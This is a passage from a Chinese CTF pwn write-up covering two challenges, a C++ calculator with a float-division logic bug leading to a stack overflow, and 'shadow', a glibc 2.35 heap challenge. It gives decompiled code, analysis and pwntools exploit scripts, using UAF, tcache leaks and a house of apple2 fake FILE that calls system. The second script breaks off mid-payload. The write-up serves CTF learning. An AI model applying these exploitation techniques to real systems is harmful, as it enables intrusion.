class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">Calculator::Calculator</span><span class="params">(Calculator *this)</span></span><br><span class="line">&#123;</span><br><span class="line">  *(_DWORD *)this = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)this + <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)this + <span class="number">2</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)this + <span class="number">3</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)this + <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)this + <span class="number">5</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)this = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)this + <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)this + <span class="number">2</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)this + <span class="number">3</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)this + <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)this + <span class="number">5</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)this + <span class="number">6</span>) = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">Calculator::Backdoor</span><span class="params">(Calculator *this)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  __int64 buf[<span class="number">128</span>]; <span class="comment">// [rsp+10h] [rbp-400h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  result = *((<span class="type">unsigned</span> <span class="type">int</span> *)this + <span class="number">6</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Create note&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, buf, *((<span class="type">int</span> *)this + <span class="number">6</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>backdoor中存在一个潜在的栈溢出，前提是能控制this+6大于0x410</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">Calculator::setnumber_floater</span><span class="params">(Calculator *this)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Floater Calculator&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%f&quot;</span>, (<span class="type">char</span> *)this + <span class="number">12</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%f&quot;</span>, (<span class="type">char</span> *)this + <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *((<span class="type">float</span> *)this + <span class="number">3</span>) &lt; <span class="number">0.0</span></span><br><span class="line">    || *((<span class="type">float</span> *)this + <span class="number">4</span>) &lt; <span class="number">0.0</span></span><br><span class="line">    || *((<span class="type">float</span> *)this + <span class="number">3</span>) &gt; <span class="number">10.0</span></span><br><span class="line">    || *((<span class="type">float</span> *)this + <span class="number">4</span>) &gt; <span class="number">10.0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No Hack&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)checkDecimalPlaces(*((<span class="type">float</span> *)this + <span class="number">3</span>)) != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *((_DWORD *)this + <span class="number">3</span>) = <span class="number">1065353216</span>;</span><br><span class="line">    *((_DWORD *)this + <span class="number">4</span>) = <span class="number">1065353216</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *((<span class="type">float</span> *)this + <span class="number">5</span>) = *((<span class="type">float</span> *)this + <span class="number">3</span>) / *((<span class="type">float</span> *)this + <span class="number">4</span>);</span><br><span class="line">  *((_DWORD *)this + <span class="number">6</span>) = (<span class="type">int</span>)*((<span class="type">float</span> *)this + <span class="number">5</span>);</span><br><span class="line">  result = *((<span class="type">unsigned</span> <span class="type">int</span> *)this + <span class="number">6</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)result &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (__int64)this;</span><br><span class="line">    --*((_DWORD *)this + <span class="number">6</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Calculator *__fastcall <span class="title function_">Calculator::setnumber_integer</span><span class="params">(Calculator *this)</span></span><br><span class="line">&#123;</span><br><span class="line">  Calculator *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Integer Calculator&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, this);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, (<span class="type">char</span> *)this + <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *(<span class="type">int</span> *)this &lt; <span class="number">0</span> || *((<span class="type">int</span> *)this + <span class="number">1</span>) &lt; <span class="number">0</span> || *(<span class="type">int</span> *)this &gt; <span class="number">10</span> || *((<span class="type">int</span> *)this + <span class="number">1</span>) &gt; <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No Hack&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  *((_DWORD *)this + <span class="number">2</span>) = *((_DWORD *)this + <span class="number">1</span>) + *(_DWORD *)this;</span><br><span class="line">  result = this;</span><br><span class="line">  *((_DWORD *)this + <span class="number">6</span>) = *((_DWORD *)this + <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入的数据限制了不能小于零不能大于十，那么整型加法就没法凑出需要的大小了。但是浮点数运算是除法，所以也许有机可乘。但是注意看运算中间有个检查，简单来讲就是检查this+3这个数的小数位数是否不为一，如果满足，则替换数字，这样运算出来的结果永远是1，显然我们要让第一个输入的数据小数位只有一个数，第二个数则无所谓。所以输入9.9和0.001就够大了。很简单的逻辑漏洞。注意一下栈平衡问题即可。</p><h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># r = remote(&#x27;34.122.93.62&#x27;, 31134)</span></span><br><span class="line">r = process(<span class="string">&#x27;CPPCalc&#x27;</span>)</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;9.9&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;0.001&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b *0x4018DC&#x27;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;1337&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x408</span>+p64(<span class="number">0x401748</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x02-shadow"><a href="#0x02-shadow" class="headerlink" title="0x02 shadow"></a>0x02 shadow</h3><h5 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h5><p>题目环境是ubuntu22.04，即glibc2.35</p><p>我给部分函数更改了名字，并且写了一些注释方便理解。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 retaddr; <span class="comment">// [rsp+18h] [rbp+8h]</span></span><br><span class="line"></span><br><span class="line">  init1(retaddr);                               <span class="comment">// 产生了两个0x20的chunk，5380=2，此处参数的retaddr是一个libc的地址，是main函数的返回地址</span></span><br><span class="line">  setbuf();</span><br><span class="line">  chal(retaddr, (__int64)a2, v3);</span><br><span class="line">  RFG_chk(retaddr);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>RFG_chk</code>这个函数是根据我自己理解改的名字，最近刚好看了一点windows pwn的知识，其中有一个保护机制叫RFG，工作原理是保存当前栈帧的返回地址，并在函数返回时对比返回地址是否正确。这个程序里的<code>RFG_chk</code>就是手动实现了这个功能。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">_QWORD *__fastcall <span class="title function_">init1</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rcx</span></span><br><span class="line">  _QWORD *result; <span class="comment">// rax</span></span><br><span class="line">  _QWORD *v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">  *v4 = a1;</span><br><span class="line">  v4[<span class="number">1</span>] = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">  v1 = count++;</span><br><span class="line">  v2 = v1;</span><br><span class="line">  result = v4;</span><br><span class="line">  chunk_list[v2] = v4;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">chal</span><span class="params">(__int64 a1, __int64 *a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 *v3; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  __int64 v6[<span class="number">2</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  __int64 retaddr; <span class="comment">// [rsp+28h] [rbp+8h]</span></span><br><span class="line"></span><br><span class="line">  v6[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v6[<span class="number">0</span>] = <span class="number">2LL</span>;</span><br><span class="line">  v3 = (__int64 *)retaddr;</span><br><span class="line">  init1(retaddr);                               <span class="comment">// 又产生了两个chunk</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu(v3, a2);</span><br><span class="line">    a2 = &amp;v5;                                   <span class="comment">// 把一个栈地址传给了一个环境变量？</span></span><br><span class="line">    v3 = (__int64 *)&amp;choice;</span><br><span class="line">    __isoc99_scanf(&amp;choice, &amp;v5);              </span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &gt; <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      edit();                                   <span class="comment">// 下标越界，UAF，但是函数结束之后edit函数里申请的chunk全部会被释放掉，虽然有uaf依然可以访问到。</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v5 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = v6;</span><br><span class="line">      show(v6);                                 <span class="comment">// 把2这个数字传了进去,最多只能show两次，每次会减一</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">LABEL_9:</span><br><span class="line">      v3 = (__int64 *)<span class="string">&quot;Wrong.&quot;</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_13E0();</span><br><span class="line">  <span class="keyword">return</span> RFG_chk(retaddr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  __int64 retaddr; <span class="comment">// [rsp+28h] [rbp+8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init1(retaddr);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(&amp;choice, &amp;v1);</span><br><span class="line">  v2 = chunk_list[v1];                          <span class="comment">// 没有下标检查</span></span><br><span class="line">  getchar();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;msg: &quot;</span>);</span><br><span class="line">  myread(*(_QWORD *)(v2 + <span class="number">8</span>));                  <span class="comment">// 会写到init1中申请的第二个chunk</span></span><br><span class="line">  RFG_chk(retaddr);                             <span class="comment">// 每次RFG（检查返回地址是否被篡改）会删除最后面的两个chunk。也就是myread里调用的那个init1</span></span><br><span class="line">  <span class="keyword">return</span> v3 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">show</span><span class="params">(_QWORD *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+18h] [rbp-18h] BYREF</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  <span class="type">void</span> *retaddr; <span class="comment">// [rsp+38h] [rbp+8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init1((__int64)retaddr);</span><br><span class="line">  <span class="keyword">if</span> ( *a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    --*a1;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(&amp;choice, &amp;v2);</span><br><span class="line">    v3 = chunk_list[v2];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;=== shadow msg ===&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n\n&quot;</span>, *(<span class="type">const</span> <span class="type">char</span> **)(v3 + <span class="number">8</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;don&#x27;t look anymore!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  RFG_chk(retaddr);</span><br><span class="line">  <span class="keyword">return</span> v4 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>很显然程序有UAF漏洞，所以可以通过tcache attack泄露堆地址和libc地址。这边详细讲讲泄露libc地址。程序每次申请堆块一定是两两申请，并且每个大小都是0x20固定。edit和show函数都是对每次申请的第二个chunk进行操作。准确来说，是从第一个chunk中取第二个chunk的地址，并进行操作。我们逐步分析。</p><p>程序初始执行到菜单时heap分布如下：<img src="https://c-lby.top/images/2024deadsec_wp/%E7%A8%8B%E5%BA%8F%E5%88%9D%E5%A7%8Bheap.png" alt="程序初始heap"></p><p>0x290处的chunk在chunklist中下标为0，如果对其进行操作，比如show，那么就会打印出红框框起来的地址处的内容，对应第二个chunk，然后这个chunk是不在chunklist中的。同理，0x2d0处的chunk在list中，但是操作的是0x300处。</p><p>那么泄露堆地址的思路很简单，只要有chunk被释放进tcachebin，被释放chunk的fd处就会有加密后的堆地址<img src="https://c-lby.top/images/2024deadsec_wp/%E6%B3%84%E9%9C%B2%E5%A0%86%E5%9C%B0%E5%9D%80.png" alt="泄露堆地址">。</p><p>我们经过一个edit操作之后，会多了两组被释放的chunk。红框对应的地址在list中下标为2，会泄露出来绿色框地址处的堆地址。记得解密。</p><p>然后我们劫持一个chunk的[1]处，edit修改为堆地址+0x2a0，show被劫持的那个chunk我们就能泄露main_areana附近的地址了。</p><p>因为chunklist在bss段，并且可以下标越界，所以选择打到stderr，劫持stdout的FILE进行house of apple2。apple2的相关内容在另一篇文章详细展开记录。</p><h5 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&#x27;./prob&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./prob&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">index</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, msg</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;index:&#x27;</span>, timeout=<span class="number">1</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;msg:&#x27;</span>, timeout=<span class="number">1</span>)</span><br><span class="line">    r.sendline(msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;index:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;=== shadow msg ===\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">c</span>):</span><br><span class="line">    key = p8(c[<span class="number">0</span>] ^ <span class="number">0x60</span>)</span><br><span class="line">    key += p8(c[<span class="number">1</span>] ^ (((key[<span class="number">0</span>] &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0xff</span>) | <span class="number">0x3</span>))</span><br><span class="line">    key += p8(c[<span class="number">2</span>] ^ (((key[<span class="number">1</span>] &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0xff</span>) | (key[<span class="number">0</span>] &gt;&gt; <span class="number">4</span>)))</span><br><span class="line">    key += p8(c[<span class="number">3</span>] ^ (((key[<span class="number">2</span>] &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0xff</span>) | (key[<span class="number">1</span>] &gt;&gt; <span class="number">4</span>)))</span><br><span class="line">    key += p8(c[<span class="number">4</span>] ^ (((key[<span class="number">3</span>] &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0xff</span>) | (key[<span class="number">2</span>] &gt;&gt; <span class="number">4</span>)))</span><br><span class="line">    key = u64(key.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    heap = key &lt;&lt; <span class="number">12</span></span><br><span class="line">    <span class="keyword">return</span> heap</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄露堆地址</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;deadbeef&#x27;</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">heap_c = r.recv(<span class="number">6</span>)</span><br><span class="line">heap = decrypt(heap_c)</span><br><span class="line">success(<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄露libc地址</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(heap+<span class="number">0x2a0</span>))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x29d90</span></span><br><span class="line">success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_file = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="string">b&#x27;  sh;&#x27;</span>,</span><br><span class="line">    <span class="number">0x10</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]),</span><br><span class="line">    <span class="number">0x20</span>: 